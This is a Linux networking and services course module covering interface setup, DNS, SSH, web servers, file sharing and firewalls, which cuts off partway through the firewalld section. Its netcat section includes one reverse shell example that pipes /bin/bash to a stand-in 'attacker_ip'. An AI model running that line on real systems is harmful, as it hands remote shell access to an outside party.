# Day 11-17: Networking and Services - Complete Guide

## Overview
Networking is fundamental to modern computing and cybersecurity. This comprehensive 7-day module covers Linux networking fundamentals, network configuration, essential services (SSH, DNS, web servers, file sharing), firewall management, and network security monitoring. You'll gain hands-on experience configuring and securing network services in production-like environments.

**Duration**: 7 Days (Days 11-17)
**Prerequisites**: Completion of Linux Fundamentals and System Administration
**Difficulty**: Intermediate to Advanced

---

## Module 1: Network Fundamentals (Day 11)

### 1.1 Understanding Network Basics

#### OSI Model and TCP/IP Stack
```
OSI Model          TCP/IP Model
---------          ------------
Application   -->  Application
Presentation  -->  Application
Session       -->  Application
Transport     -->  Transport (TCP/UDP)
Network       -->  Internet (IP)
Data Link     -->  Network Access
Physical      -->  Network Access
```

#### IP Addressing Fundamentals

**IPv4 Address Classes**
```
Class A: 1.0.0.0    - 126.255.255.255  (Large networks)
Class B: 128.0.0.0  - 191.255.255.255  (Medium networks)
Class C: 192.0.0.0  - 223.255.255.255  (Small networks)
Class D: 224.0.0.0  - 239.255.255.255  (Multicast)
Class E: 240.0.0.0  - 255.255.255.255  (Reserved)
```

**Private IP Ranges (RFC 1918)**
```
10.0.0.0/8        (10.0.0.0 - 10.255.255.255)
172.16.0.0/12     (172.16.0.0 - 172.31.255.255)
192.168.0.0/16    (192.168.0.0 - 192.168.255.255)
```

**Special IP Addresses**
```
127.0.0.1         - Localhost (loopback)
0.0.0.0           - All interfaces / default route
255.255.255.255   - Broadcast address
169.254.0.0/16    - Link-local (APIPA)
```

#### Subnetting Basics
```
CIDR Notation    Subnet Mask        Hosts    Networks
/8               255.0.0.0          16M      1
/16              255.255.0.0        65K      256
/24              255.255.255.0      254      65K
/25              255.255.255.128    126      
/26              255.255.255.192    62       
/27              255.255.255.224    30       
/28              255.255.255.240    14       
/30              255.255.255.252    2        (Point-to-point)
```

**Subnetting Example**
```
Network: 192.168.1.0/24

Subnet Mask: 255.255.255.0
Network Address: 192.168.1.0
First Host: 192.168.1.1
Last Host: 192.168.1.254
Broadcast: 192.168.1.255
Total Hosts: 254
```

#### Common Network Ports
```
Port    Service         Protocol
20/21   FTP            TCP
22      SSH            TCP
23      Telnet         TCP
25      SMTP           TCP
53      DNS            TCP/UDP
67/68   DHCP           UDP
80      HTTP           TCP
110     POP3           TCP
143     IMAP           TCP
443     HTTPS          TCP
445     SMB            TCP
3306    MySQL          TCP
3389    RDP            TCP
5432    PostgreSQL     TCP
8080    HTTP-Alt       TCP
```

### 1.2 Network Configuration Tools

#### ip Command (Modern Standard)

**Viewing Network Information**
```bash
# Show all network interfaces
ip link show
ip link

# Show IP addresses
ip addr show
ip addr
ip a

# Show specific interface
ip addr show eth0

# Show routing table
ip route show
ip route
ip r

# Show ARP table
ip neigh show
ip neigh
```

**Configuring Network Interfaces**
```bash
# Bring interface up
sudo ip link set eth0 up

# Bring interface down
sudo ip link set eth0 down

# Add IP address
sudo ip addr add 192.168.1.100/24 dev eth0

# Delete IP address
sudo ip addr del 192.168.1.100/24 dev eth0

# Add default gateway
sudo ip route add default via 192.168.1.1

# Add static route
sudo ip route add 10.0.0.0/8 via 192.168.1.254

# Delete route
sudo ip route del 10.0.0.0/8

# Flush all addresses from interface
sudo ip addr flush dev eth0
```

#### ifconfig Command (Legacy but Still Used)
```bash
# Show all interfaces
ifconfig

# Show specific interface
ifconfig eth0

# Configure IP address
sudo ifconfig eth0 192.168.1.100 netmask 255.255.255.0

# Bring interface up
sudo ifconfig eth0 up

# Bring interface down
sudo ifconfig eth0 down

# Set MTU
sudo ifconfig eth0 mtu 1500

# Enable promiscuous mode
sudo ifconfig eth0 promisc
```

#### NetworkManager (nmcli)
```bash
# Show all connections
nmcli connection show

# Show active connections
nmcli connection show --active

# Show device status
nmcli device status

# Show detailed device info
nmcli device show eth0

# Create new connection
sudo nmcli connection add type ethernet con-name myconn ifname eth0

# Set static IP
sudo nmcli connection modify myconn ipv4.addresses 192.168.1.100/24
sudo nmcli connection modify myconn ipv4.gateway 192.168.1.1
sudo nmcli connection modify myconn ipv4.dns "8.8.8.8 8.8.4.4"
sudo nmcli connection modify myconn ipv4.method manual

# Set DHCP
sudo nmcli connection modify myconn ipv4.method auto

# Activate connection
sudo nmcli connection up myconn

# Deactivate connection
sudo nmcli connection down myconn

# Delete connection
sudo nmcli connection delete myconn

# Reload configuration
sudo nmcli connection reload
```

### 1.3 Network Configuration Files

#### Debian/Ubuntu - /etc/network/interfaces
```bash
# Loopback interface
auto lo
iface lo inet loopback

# DHCP configuration
auto eth0
iface eth0 inet dhcp

# Static IP configuration
auto eth0
iface eth0 inet static
    address 192.168.1.100
    netmask 255.255.255.0
    gateway 192.168.1.1
    dns-nameservers 8.8.8.8 8.8.4.4

# Multiple IP addresses
auto eth0
iface eth0 inet static
    address 192.168.1.100
    netmask 255.255.255.0
    gateway 192.168.1.1

auto eth0:0
iface eth0:0 inet static
    address 192.168.1.101
    netmask 255.255.255.0
```

#### RHEL/CentOS - /etc/sysconfig/network-scripts/ifcfg-eth0
```bash
# DHCP configuration
DEVICE=eth0
BOOTPROTO=dhcp
ONBOOT=yes

# Static IP configuration
DEVICE=eth0
BOOTPROTO=static
ONBOOT=yes
IPADDR=192.168.1.100
NETMASK=255.255.255.0
GATEWAY=192.168.1.1
DNS1=8.8.8.8
DNS2=8.8.4.4
```

#### Netplan (Ubuntu 18.04+) - /etc/netplan/*.yaml
```yaml
network:
  version: 2
  renderer: networkd
  ethernets:
    eth0:
      dhcp4: true

# Static IP with Netplan
network:
  version: 2
  renderer: networkd
  ethernets:
    eth0:
      dhcp4: no
      addresses:
        - 192.168.1.100/24
      gateway4: 192.168.1.1
      nameservers:
        addresses: [8.8.8.8, 8.8.4.4]

# Apply netplan configuration
sudo netplan apply

# Test configuration
sudo netplan try
```

### 1.4 Network Troubleshooting Tools

#### ping Command
```bash
# Basic ping
ping google.com

# Ping with count
ping -c 4 google.com

# Ping with interval
ping -i 2 google.com

# Ping with packet size
ping -s 1000 google.com

# Flood ping (requires root)
sudo ping -f google.com

# Ping IPv6
ping6 google.com

# Ping specific interface
ping -I eth0 192.168.1.1
```

#### traceroute / tracepath
```bash
# Trace route to destination
traceroute google.com

# Use ICMP instead of UDP
traceroute -I google.com

# Use TCP
traceroute -T google.com

# Set max hops
traceroute -m 15 google.com

# tracepath (no root required)
tracepath google.com
```

#### mtr (My Traceroute)
```bash
# Install mtr
sudo apt install mtr

# Interactive mode
mtr google.com

# Report mode (10 cycles)
mtr -r -c 10 google.com

# No DNS resolution
mtr -n google.com

# Use TCP
mtr -T google.com

# Show both hostnames and IPs
mtr -b google.com
```

#### netcat (nc) - Swiss Army Knife
```bash
# Listen on port
nc -l 1234

# Connect to port
nc 192.168.1.100 1234

# Port scanning
nc -zv 192.168.1.100 20-80

# Transfer file
# Receiver:
nc -l 1234 > received_file
# Sender:
nc 192.168.1.100 1234 < file_to_send

# Simple chat
# Server:
nc -l 1234
# Client:
nc 192.168.1.100 1234

# Banner grabbing
nc -v google.com 80
GET / HTTP/1.0

# UDP mode
nc -u 192.168.1.100 53

# Create reverse shell (for testing only!)
# Listener:
nc -l 4444
# Target:
nc attacker_ip 4444 -e /bin/bash
```

#### tcpdump (Packet Capture)
```bash
# Capture on interface
sudo tcpdump -i eth0

# Capture specific number of packets
sudo tcpdump -i eth0 -c 10

# Capture and save to file
sudo tcpdump -i eth0 -w capture.pcap

# Read from file
tcpdump -r capture.pcap

# Capture specific host
sudo tcpdump -i eth0 host 192.168.1.100

# Capture specific port
sudo tcpdump -i eth0 port 80

# Capture TCP traffic
sudo tcpdump -i eth0 tcp

# Capture UDP traffic
sudo tcpdump -i eth0 udp

# Capture with verbose output
sudo tcpdump -i eth0 -v

# Show packet contents in hex and ASCII
sudo tcpdump -i eth0 -X

# Capture HTTP traffic
sudo tcpdump -i eth0 -A 'tcp port 80'

# Capture traffic between two hosts
sudo tcpdump -i eth0 host 192.168.1.100 and host 192.168.1.200

# Capture traffic not from specific host
sudo tcpdump -i eth0 not host 192.168.1.100
```

---

## Module 2: DNS and Name Resolution (Day 12)

### 2.1 Understanding DNS

#### DNS Hierarchy
```
Root (.)
  |
  +-- com.
  |    +-- google.com.
  |    +-- example.com.
  |
  +-- org.
  |    +-- wikipedia.org.
  |
  +-- net.
       +-- cloudflare.net.
```

#### DNS Record Types
```
A       - IPv4 address
AAAA    - IPv6 address
CNAME   - Canonical name (alias)
MX      - Mail exchange
NS      - Name server
PTR     - Pointer (reverse DNS)
SOA     - Start of authority
TXT     - Text record
SRV     - Service record
```

### 2.2 DNS Configuration Files

#### /etc/hosts
```bash
# Local hostname resolution
127.0.0.1       localhost
127.0.1.1       myhost
192.168.1.100   server1.local server1
192.168.1.101   server2.local server2

# IPv6
::1             localhost ip6-localhost ip6-loopback
```

#### /etc/resolv.conf
```bash
# DNS nameservers
nameserver 8.8.8.8
nameserver 8.8.4.4
nameserver 1.1.1.1

# Search domains
search example.com local.lan

# Options
options timeout:2
options attempts:3
options rotate
```

#### /etc/nsswitch.conf
```bash
# Name Service Switch configuration
# Order of hostname resolution
hosts: files dns myhostname

# files = /etc/hosts
# dns = DNS servers
# myhostname = system hostname
```

### 2.3 DNS Query Tools

#### host Command
```bash
# Basic lookup
host google.com

# Specific record type
host -t A google.com
host -t MX google.com
host -t NS google.com
host -t TXT google.com

# Reverse lookup
host 8.8.8.8

# Use specific nameserver
host google.com 8.8.8.8

# Verbose output
host -v google.com
```

#### nslookup Command
```bash
# Basic lookup
nslookup google.com

# Interactive mode
nslookup
> server 8.8.8.8
> google.com
> exit

# Specific record type
nslookup -type=MX google.com
nslookup -type=NS google.com

# Reverse lookup
nslookup 8.8.8.8
```

#### dig Command (Most Powerful)
```bash
# Basic lookup
dig google.com

# Short answer only
dig google.com +short

# Specific record type
dig google.com A
dig google.com MX
dig google.com NS
dig google.com TXT
dig google.com AAAA

# Query specific nameserver
dig @8.8.8.8 google.com

# Reverse lookup
dig -x 8.8.8.8

# Trace DNS path
dig google.com +trace

# Show only answer section
dig google.com +noall +answer

# Query all records
dig google.com ANY

# Batch queries from file
dig -f domains.txt

# Check DNSSEC
dig google.com +dnssec
```

### 2.4 Setting Up Local DNS Server (dnsmasq)

#### Installing dnsmasq
```bash
# Install
sudo apt install dnsmasq

# Configuration file
sudo nano /etc/dnsmasq.conf

# Basic configuration
listen-address=127.0.0.1
bind-interfaces
domain=local.lan
expand-hosts

# Upstream DNS servers
server=8.8.8.8
server=8.8.4.4

# Local DNS entries
address=/myserver.local/192.168.1.100

# DHCP range (optional)
dhcp-range=192.168.1.50,192.168.1.150,12h

# Restart service
sudo systemctl restart dnsmasq
sudo systemctl enable dnsmasq

# Test
dig @127.0.0.1 myserver.local
```

---

## Module 3: SSH - Secure Shell (Day 13)

### 3.1 SSH Fundamentals

#### SSH Protocol Overview
- **Port**: 22 (default)
- **Protocol**: TCP
- **Encryption**: Asymmetric + Symmetric
- **Authentication**: Password, Public Key, Certificate

#### SSH Components
- **ssh**: Client for connecting
- **sshd**: Server daemon
- **ssh-keygen**: Generate key pairs
- **ssh-copy-id**: Copy public key to server
- **scp**: Secure copy
- **sftp**: Secure FTP

### 3.2 SSH Client Usage

#### Basic SSH Connection
```bash
# Connect to server
ssh username@hostname
ssh username@192.168.1.100

# Connect with specific port
ssh -p 2222 username@hostname

# Connect with verbose output
ssh -v username@hostname
ssh -vv username@hostname  # More verbose
ssh -vvv username@hostname # Maximum verbosity

# Execute command remotely
ssh username@hostname 'ls -la'
ssh username@hostname 'df -h'

# Run multiple commands
ssh username@hostname 'uptime; free -h; df -h'

# Interactive shell with command
ssh -t username@hostname 'sudo tail -f /var/log/syslog'
```

#### SSH Key-Based Authentication

**Generate SSH Key Pair**
```bash
# Generate RSA key (4096 bits)
ssh-keygen -t rsa -b 4096 -C "your_email@example.com"

# Generate Ed25519 key (modern, recommended)
ssh-keygen -t ed25519 -C "your_email@example.com"

# Generate with custom filename
ssh-keygen -t rsa -b 4096 -f ~/.ssh/mykey

# Generate without passphrase (not recommended)
ssh-keygen -t rsa -b 4096 -N ""

# Change key passphrase
ssh-keygen -p -f ~/.ssh/id_rsa
```

**Copy Public Key to Server**
```bash
# Using ssh-copy-id (easiest)
ssh-copy-id username@hostname

# With specific key
ssh-copy-id -i ~/.ssh/mykey.pub username@hostname

# Manual method
cat ~/.ssh/id_rsa.pub | ssh username@hostname 'mkdir -p ~/.ssh && cat >> ~/.ssh/authorized_keys'

# Set correct permissions
ssh username@hostname 'chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys'
```

**Using SSH Keys**
```bash
# Connect with specific key
ssh -i ~/.ssh/mykey username@hostname

# Add key to ssh-agent
eval "$(ssh-agent -s)"
ssh-add ~/.ssh/id_rsa

# List loaded keys
ssh-add -l

# Remove all keys from agent
ssh-add -D
```

### 3.3 SSH Server Configuration

#### Main Configuration File: /etc/ssh/sshd_config
```bash
# Edit configuration
sudo nano /etc/ssh/sshd_config

# Basic security settings
Port 22                          # Change to non-standard port
PermitRootLogin no              # Disable root login
PasswordAuthentication no       # Disable password auth (use keys)
PubkeyAuthentication yes        # Enable key-based auth
PermitEmptyPasswords no         # No empty passwords
MaxAuthTries 3                  # Limit auth attempts
MaxSessions 2                   # Limit concurrent sessions
ClientAliveInterval 300         # Keep-alive interval
ClientAliveCountMax 2           # Max keep-alive messages

# Allow specific users
AllowUsers user1 user2

# Allow specific groups
AllowGroups sshusers

# Deny specific users
DenyUsers baduser

# Listen on specific IP
ListenAddress 192.168.1.100

# Protocol version
Protocol 2

# Log level
LogLevel VERBOSE

# Test configuration
sudo sshd -t

# Restart SSH service
sudo systemctl restart sshd
sudo systemctl restart ssh  # Debian/Ubuntu
```


### 3.4 SSH Advanced Features

#### SSH Port Forwarding (Tunneling)

**Local Port Forwarding**
```bash
# Forward local port to remote
ssh -L local_port:destination:destination_port username@ssh_server

# Example: Access remote MySQL
ssh -L 3306:localhost:3306 user@dbserver
# Now connect to localhost:3306

# Access web service through SSH
ssh -L 8080:internal-server:80 user@gateway
# Browse to http://localhost:8080

# Keep connection open
ssh -L 8080:internal-server:80 -N user@gateway
```

**Remote Port Forwarding**
```bash
# Forward remote port to local
ssh -R remote_port:localhost:local_port username@ssh_server

# Example: Expose local web server
ssh -R 8080:localhost:80 user@remote-server
# Remote users access remote-server:8080

# Reverse SSH tunnel
ssh -R 2222:localhost:22 user@public-server
# From public-server: ssh -p 2222 localhost
```


**Dynamic Port Forwarding (SOCKS Proxy)**
```bash
# Create SOCKS proxy
ssh -D 1080 user@ssh-server

# Configure browser to use localhost:1080 as SOCKS5 proxy
# All traffic routes through SSH tunnel

# With compression
ssh -D 1080 -C user@ssh-server
```

**SSH Config File (~/.ssh/config)**
```bash
# Create/edit config
nano ~/.ssh/config

# Example configuration
Host myserver
    HostName 192.168.1.100
    User admin
    Port 2222
    IdentityFile ~/.ssh/mykey
    ForwardAgent yes
    
Host jump
    HostName jumphost.example.com
    User jumpuser
    
Host internal
    HostName 10.0.0.50
    User internaluser
    ProxyJump jump

# Now connect simply with
ssh myserver
ssh internal
```


### 3.5 SCP and SFTP

#### SCP (Secure Copy)
```bash
# Copy file to remote
scp file.txt user@host:/remote/path/

# Copy file from remote
scp user@host:/remote/file.txt /local/path/

# Copy directory recursively
scp -r directory/ user@host:/remote/path/

# Copy with specific port
scp -P 2222 file.txt user@host:/path/

# Copy with specific key
scp -i ~/.ssh/mykey file.txt user@host:/path/

# Copy with compression
scp -C largefile.tar user@host:/path/

# Preserve file attributes
scp -p file.txt user@host:/path/

# Copy between two remote hosts
scp user1@host1:/path/file.txt user2@host2:/path/

# Show progress
scp -v file.txt user@host:/path/

# Limit bandwidth (KB/s)
scp -l 1000 file.txt user@host:/path/
```


#### SFTP (Secure FTP)
```bash
# Connect to SFTP server
sftp user@host

# SFTP commands
sftp> ls                    # List remote files
sftp> lls                   # List local files
sftp> pwd                   # Remote working directory
sftp> lpwd                  # Local working directory
sftp> cd /remote/path       # Change remote directory
sftp> lcd /local/path       # Change local directory
sftp> get file.txt          # Download file
sftp> get -r directory/     # Download directory
sftp> put file.txt          # Upload file
sftp> put -r directory/     # Upload directory
sftp> mkdir newdir          # Create remote directory
sftp> rmdir dirname         # Remove remote directory
sftp> rm file.txt           # Delete remote file
sftp> rename old.txt new.txt # Rename remote file
sftp> exit                  # Exit SFTP

# Batch mode
sftp -b commands.txt user@host

# Example commands.txt
cd /upload
put file1.txt
put file2.txt
exit
```


---

## Module 4: Web Servers (Day 14)

### 4.1 Apache HTTP Server

#### Installing Apache
```bash
# Debian/Ubuntu
sudo apt update
sudo apt install apache2

# RHEL/CentOS
sudo yum install httpd

# Start and enable
sudo systemctl start apache2    # Debian/Ubuntu
sudo systemctl start httpd      # RHEL/CentOS
sudo systemctl enable apache2
sudo systemctl enable httpd

# Check status
sudo systemctl status apache2
```

#### Apache Directory Structure
```
/etc/apache2/               # Debian/Ubuntu
├── apache2.conf           # Main configuration
├── ports.conf             # Port configuration
├── sites-available/       # Available sites
├── sites-enabled/         # Enabled sites
├── mods-available/        # Available modules
├── mods-enabled/          # Enabled modules
└── conf-available/        # Available configs

/etc/httpd/                # RHEL/CentOS
├── conf/
│   └── httpd.conf        # Main configuration
└── conf.d/               # Additional configs
```


#### Basic Apache Configuration
```bash
# Test configuration
sudo apache2ctl configtest
sudo apachectl configtest

# Reload configuration
sudo systemctl reload apache2

# Enable/disable modules
sudo a2enmod rewrite
sudo a2enmod ssl
sudo a2dismod status

# Enable/disable sites
sudo a2ensite mysite.conf
sudo a2dissite 000-default.conf

# View loaded modules
apache2ctl -M
```

#### Virtual Host Configuration
```apache
# /etc/apache2/sites-available/example.com.conf

<VirtualHost *:80>
    ServerName example.com
    ServerAlias www.example.com
    ServerAdmin admin@example.com
    
    DocumentRoot /var/www/example.com
    
    <Directory /var/www/example.com>
        Options -Indexes +FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>
    
    ErrorLog ${APACHE_LOG_DIR}/example.com-error.log
    CustomLog ${APACHE_LOG_DIR}/example.com-access.log combined
</VirtualHost>
```


#### SSL/TLS Configuration with Let's Encrypt
```bash
# Install Certbot
sudo apt install certbot python3-certbot-apache

# Obtain certificate
sudo certbot --apache -d example.com -d www.example.com

# Certificate auto-renewal
sudo certbot renew --dry-run

# Auto-renewal is set up via systemd timer
sudo systemctl status certbot.timer

# Manual renewal
sudo certbot renew

# SSL Virtual Host (auto-generated)
<VirtualHost *:443>
    ServerName example.com
    DocumentRoot /var/www/example.com
    
    SSLEngine on
    SSLCertificateFile /etc/letsencrypt/live/example.com/fullchain.pem
    SSLCertificateKeyFile /etc/letsencrypt/live/example.com/privkey.pem
    Include /etc/letsencrypt/options-ssl-apache.conf
</VirtualHost>
```


### 4.2 Nginx Web Server

#### Installing Nginx
```bash
# Debian/Ubuntu
sudo apt update
sudo apt install nginx

# RHEL/CentOS
sudo yum install epel-release
sudo yum install nginx

# Start and enable
sudo systemctl start nginx
sudo systemctl enable nginx

# Check status
sudo systemctl status nginx
```

#### Nginx Directory Structure
```
/etc/nginx/
├── nginx.conf              # Main configuration
├── sites-available/        # Available sites
├── sites-enabled/          # Enabled sites (symlinks)
├── conf.d/                 # Additional configs
└── snippets/               # Reusable config snippets

/var/www/html/              # Default web root
/var/log/nginx/             # Log files
```


#### Basic Nginx Configuration
```bash
# Test configuration
sudo nginx -t

# Reload configuration
sudo systemctl reload nginx

# View configuration
nginx -T

# Enable site (create symlink)
sudo ln -s /etc/nginx/sites-available/example.com /etc/nginx/sites-enabled/

# Disable site (remove symlink)
sudo rm /etc/nginx/sites-enabled/example.com
```

#### Nginx Server Block (Virtual Host)
```nginx
# /etc/nginx/sites-available/example.com

server {
    listen 80;
    listen [::]:80;
    
    server_name example.com www.example.com;
    root /var/www/example.com;
    index index.html index.htm index.php;
    
    access_log /var/log/nginx/example.com-access.log;
    error_log /var/log/nginx/example.com-error.log;
    
    location / {
        try_files $uri $uri/ =404;
    }
    
    location ~ \.php$ {
        include snippets/fastcgi-php.conf;
        fastcgi_pass unix:/var/run/php/php7.4-fpm.sock;
    }
    
    location ~ /\.ht {
        deny all;
    }
}
```


#### Nginx SSL/TLS Configuration
```bash
# Install Certbot for Nginx
sudo apt install certbot python3-certbot-nginx

# Obtain certificate
sudo certbot --nginx -d example.com -d www.example.com

# SSL Server Block
server {
    listen 443 ssl http2;
    listen [::]:443 ssl http2;
    
    server_name example.com www.example.com;
    root /var/www/example.com;
    
    ssl_certificate /etc/letsencrypt/live/example.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/example.com/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers HIGH:!aNULL:!MD5;
    ssl_prefer_server_ciphers on;
    
    location / {
        try_files $uri $uri/ =404;
    }
}

# Redirect HTTP to HTTPS
server {
    listen 80;
    server_name example.com www.example.com;
    return 301 https://$server_name$request_uri;
}
```


#### Nginx as Reverse Proxy
```nginx
server {
    listen 80;
    server_name app.example.com;
    
    location / {
        proxy_pass http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header Upgrade $http_upgrade;
        proxy_set_header Connection 'upgrade';
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
        proxy_set_header X-Forwarded-Proto $scheme;
        proxy_cache_bypass $http_upgrade;
    }
}
```

#### Nginx Load Balancing
```nginx
upstream backend {
    least_conn;  # Load balancing method
    server backend1.example.com:8080;
    server backend2.example.com:8080;
    server backend3.example.com:8080;
}

server {
    listen 80;
    server_name example.com;
    
    location / {
        proxy_pass http://backend;
    }
}
```


---

## Module 5: File Sharing Services (Day 15)

### 5.1 Samba (Windows File Sharing)

#### Installing Samba
```bash
# Install Samba
sudo apt install samba samba-common-bin

# Check version
smbd --version

# Start and enable
sudo systemctl start smbd
sudo systemctl enable smbd
```

#### Samba Configuration (/etc/samba/smb.conf)
```ini
[global]
    workgroup = WORKGROUP
    server string = Samba Server
    security = user
    map to guest = Bad User
    dns proxy = no

[shared]
    path = /srv/samba/shared
    browseable = yes
    writable = yes
    guest ok = no
    valid users = @smbgroup
    create mask = 0660
    directory mask = 0770

[public]
    path = /srv/samba/public
    browseable = yes
    writable = yes
    guest ok = yes
    read only = no
    create mask = 0777
    directory mask = 0777
```


#### Samba User Management
```bash
# Create Samba user (must be Linux user first)
sudo useradd -M -s /sbin/nologin smbuser
sudo smbpasswd -a smbuser

# Change Samba password
sudo smbpasswd smbuser

# Delete Samba user
sudo smbpasswd -x smbuser

# List Samba users
sudo pdbedit -L

# Create group for Samba
sudo groupadd smbgroup
sudo usermod -aG smbgroup smbuser

# Create shared directory
sudo mkdir -p /srv/samba/shared
sudo chown -R :smbgroup /srv/samba/shared
sudo chmod -R 0770 /srv/samba/shared

# Test configuration
testparm

# Restart Samba
sudo systemctl restart smbd
```

#### Accessing Samba Shares
```bash
# From Linux
smbclient //server/share -U username

# Mount Samba share
sudo mount -t cifs //server/share /mnt/share -o username=user,password=pass

# Permanent mount in /etc/fstab
//server/share /mnt/share cifs credentials=/root/.smbcredentials,uid=1000,gid=1000 0 0

# Credentials file (/root/.smbcredentials)
username=smbuser
password=password
```


### 5.2 NFS (Network File System)

#### Installing NFS Server
```bash
# Debian/Ubuntu
sudo apt install nfs-kernel-server

# RHEL/CentOS
sudo yum install nfs-utils

# Start and enable
sudo systemctl start nfs-server
sudo systemctl enable nfs-server
```

#### NFS Server Configuration (/etc/exports)
```bash
# Edit exports file
sudo nano /etc/exports

# Export examples
/srv/nfs/shared    192.168.1.0/24(rw,sync,no_subtree_check)
/srv/nfs/public    *(ro,sync,no_subtree_check)
/home              192.168.1.100(rw,sync,no_root_squash)

# Options:
# rw - Read/write
# ro - Read-only
# sync - Synchronous writes
# async - Asynchronous writes
# no_subtree_check - Disable subtree checking
# no_root_squash - Don't map root to nobody
# all_squash - Map all users to nobody

# Apply changes
sudo exportfs -ra

# Show current exports
sudo exportfs -v

# Create export directories
sudo mkdir -p /srv/nfs/shared
sudo chown nobody:nogroup /srv/nfs/shared
sudo chmod 777 /srv/nfs/shared
```


#### NFS Client Configuration
```bash
# Install NFS client
sudo apt install nfs-common

# Show available exports
showmount -e nfs-server

# Mount NFS share
sudo mount nfs-server:/srv/nfs/shared /mnt/nfs

# Mount with options
sudo mount -t nfs -o rw,soft,intr nfs-server:/srv/nfs/shared /mnt/nfs

# Permanent mount in /etc/fstab
nfs-server:/srv/nfs/shared /mnt/nfs nfs defaults 0 0

# Unmount
sudo umount /mnt/nfs

# Force unmount
sudo umount -f /mnt/nfs
```

### 5.3 FTP Services

#### Installing vsftpd (Very Secure FTP Daemon)
```bash
# Install vsftpd
sudo apt install vsftpd

# Start and enable
sudo systemctl start vsftpd
sudo systemctl enable vsftpd
```

#### vsftpd Configuration (/etc/vsftpd.conf)
```bash
# Basic settings
listen=YES
anonymous_enable=NO
local_enable=YES
write_enable=YES
local_umask=022
dirmessage_enable=YES
xferlog_enable=YES
connect_from_port_20=YES

# Chroot users to home directory
chroot_local_user=YES
allow_writeable_chroot=YES

# Passive mode
pasv_enable=YES
pasv_min_port=40000
pasv_max_port=50000

# Security
ssl_enable=YES
rsa_cert_file=/etc/ssl/certs/vsftpd.pem
rsa_private_key_file=/etc/ssl/private/vsftpd.key

# Restart service
sudo systemctl restart vsftpd
```


---

## Module 6: Firewall Configuration (Day 16)

### 6.1 iptables Fundamentals

#### iptables Concepts
```
Tables:
- filter: Default table for packet filtering
- nat: Network Address Translation
- mangle: Packet alteration
- raw: Connection tracking exemption

Chains:
- INPUT: Incoming packets
- OUTPUT: Outgoing packets
- FORWARD: Routed packets
- PREROUTING: Before routing decision
- POSTROUTING: After routing decision

Targets:
- ACCEPT: Allow packet
- DROP: Silently discard packet
- REJECT: Discard and send error
- LOG: Log packet
- MASQUERADE: Dynamic NAT
```

#### Basic iptables Commands
```bash
# View current rules
sudo iptables -L
sudo iptables -L -v -n

# View with line numbers
sudo iptables -L --line-numbers

# View specific chain
sudo iptables -L INPUT

# Flush all rules
sudo iptables -F

# Delete specific rule
sudo iptables -D INPUT 3

# Set default policies
sudo iptables -P INPUT DROP
sudo iptables -P FORWARD DROP
sudo iptables -P OUTPUT ACCEPT
```


#### Common iptables Rules
```bash
# Allow loopback
sudo iptables -A INPUT -i lo -j ACCEPT

# Allow established connections
sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

# Allow SSH
sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# Allow HTTP and HTTPS
sudo iptables -A INPUT -p tcp --dport 80 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# Allow from specific IP
sudo iptables -A INPUT -s 192.168.1.100 -j ACCEPT

# Allow from subnet
sudo iptables -A INPUT -s 192.168.1.0/24 -j ACCEPT

# Block specific IP
sudo iptables -A INPUT -s 10.0.0.50 -j DROP

# Allow ping (ICMP)
sudo iptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPT

# Rate limit SSH connections
sudo iptables -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW -m recent --set
sudo iptables -A INPUT -p tcp --dport 22 -m conntrack --ctstate NEW -m recent --update --seconds 60 --hitcount 4 -j DROP

# Log dropped packets
sudo iptables -A INPUT -j LOG --log-prefix "IPTables-Dropped: "

# Drop all other input
sudo iptables -A INPUT -j DROP
```


#### Saving and Restoring iptables Rules
```bash
# Debian/Ubuntu
sudo apt install iptables-persistent
sudo netfilter-persistent save
sudo netfilter-persistent reload

# Manual save
sudo iptables-save > /etc/iptables/rules.v4
sudo ip6tables-save > /etc/iptables/rules.v6

# Manual restore
sudo iptables-restore < /etc/iptables/rules.v4
sudo ip6tables-restore < /etc/iptables/rules.v6

# RHEL/CentOS
sudo service iptables save
sudo systemctl enable iptables
```

### 6.2 UFW (Uncomplicated Firewall)

#### Basic UFW Commands
```bash
# Install UFW
sudo apt install ufw

# Enable UFW
sudo ufw enable

# Disable UFW
sudo ufw disable

# Check status
sudo ufw status
sudo ufw status verbose
sudo ufw status numbered

# Default policies
sudo ufw default deny incoming
sudo ufw default allow outgoing

# Allow service by name
sudo ufw allow ssh
sudo ufw allow http
sudo ufw allow https

# Allow specific port
sudo ufw allow 22
sudo ufw allow 80/tcp
sudo ufw allow 53/udp

# Allow port range
sudo ufw allow 6000:6007/tcp

# Allow from specific IP
sudo ufw allow from 192.168.1.100

# Allow from subnet
sudo ufw allow from 192.168.1.0/24

# Allow to specific port from IP
sudo ufw allow from 192.168.1.100 to any port 22

# Deny connections
sudo ufw deny 23
sudo ufw deny from 10.0.0.50

# Delete rule
sudo ufw delete allow 80
sudo ufw delete 3  # By number

# Reset UFW
sudo ufw reset
```


### 6.3 firewalld (RHEL/CentOS)

#### Basic firewalld Commands
```bash
# Install firewalld
sudo yum install firewalld

# Start and enable
sudo systemctl start firewalld
sudo systemctl enable firewalld

# Check status
sudo firewall-cmd --state

# List all zones
sudo firewall-cmd --get-zones

# List active zones
sudo firewall-cmd --get-active-zones

# Get default zone
sudo firewall-cmd --get-default-zone

# Set default zone
sudo firewall-cmd --set-default-zone=public

# List services in zone
sudo firewall-cmd --zone=public --list-all

# Add service
sudo firewall-cmd --zone=public --add-service=http
sudo firewall-cmd --zone=public --add-service=https

# Add port
sudo firewall-cmd --zone=public --add-port=8080/tcp

# Remove service
sudo firewall-cmd --zone=public --remove-service=http

# Make changes permanent
sudo firewall-cmd --runtime-to-permanent

# Add permanent rule
sudo firewall-cmd --permanent --zone=public --add-service=http
sudo firewall-cmd --reload

# Add rich rule
